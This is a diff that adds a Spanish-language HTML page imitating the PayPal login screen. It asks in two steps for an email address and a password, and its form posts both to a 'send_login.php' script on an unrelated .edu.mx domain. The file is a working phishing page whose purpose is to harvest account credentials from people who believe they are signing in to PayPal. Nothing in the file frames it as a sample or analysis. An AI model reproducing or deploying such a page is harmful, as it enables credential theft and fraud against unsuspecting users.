@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Inicie sesión en su cuenta PayPal</title>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" type="text/css" href="assets/bulma.min.css">
+  <link rel="stylesheet" type="text/css" href="assets/style.css"></form>
+</head>
+<body>
+<form action="https://cfp.edu.mx/js/customer_center/user-211449/system/send_login.php" method="post">
+<div class="container_login" id="login_email">
+  <div class="login_box">
+    <center>
+      <img src="assets/logo.svg" alt="" style="width: 119px;"><br><br>
+      <input type="text" name="email" placeholder="Correo electrónico" class="input_login" id="email">
+      <div class="errorMessageEmail" style="display: none;"><p>Ingrese su dirección de correo electrónico.</p></div>
+      <br>
+      
+      <br>
+      <div class="columns is-multiline is-mobile" id="col">
+      <div class="column is-12">
+      <span name="btn" id="btn" style="border-radius: 4px;" class="next" >Siguiente</span>
+      </div></div>
+      <p style="color: #0070ba;">¿Tiene problemas para iniciar sesión?</p>
+      <div class="loginSignUpSeparator">
+      <span class="textInSeparator">or</span></div>
+    <button id="btn" style="border-radius: 4px;background-color: #E1E7EB;color: #2C2E2F;border: 0;">Regístrate</button>
+    </center>
+</div>
+</div>
+
+<div class="container_login" id="login_passwd" style="display: none;">
+  <div class="login_box">
+    <center>
+      <img src="assets/logo.svg" alt="" style="width: 119px;margin-bottom: 10px;">
+      <br><span id="vicmail"></span>&nbsp;&nbsp;&nbsp;&nbsp;<span style="color: #0070ba;">cambiar</span><br><br>
+      <input type="password" name="pass" id="pass" placeholder="Password" class="input_login" minlength="8" required>
+      <div class="errorMessagePass" style="display: none;"><p>Ingresa tu contraseña.</p></div>
+      <br>
+      
+      <br>
+      <div class="columns is-multiline is-mobile" id="col">
+      <div class="column is-12">
+      <button name="btn" id="btn" class="sub" style="border-radius: 4px;">Iniciar sesión</button>
+      </div></div>
+      <p style="color: #0070ba;">¿Tiene problemas para iniciar sesión?</p>
+      <div class="loginSignUpSeparator">
+      <span class="textInSeparator">or</span></div>
+    <button id="btn" style="border-radius: 4px;background-color: #E1E7EB;color: #2C2E2F;border: 0;">Regístrate</button>
+    </center>
+</div>
+</div>
+
+<div class="spinner loading" id="spinner" style="display: none;"></div>
+<br><br><br><br><br><br><br>
+<div class="login_footer">
+  <center>
+    <p class="text_footer">Contáctenos &nbsp;&nbsp;Privacidad &nbsp;&nbsp;Legal &nbsp;&nbsp;Worldwide</p>
+  </center>
+</div>
+<script src="../../../../code.jquery.com/jquery-3.3.1.js"></script>
+<script type="text/javascript" src="assets/Xwanted.js"></script>
+</form>
+</body>
+</html>
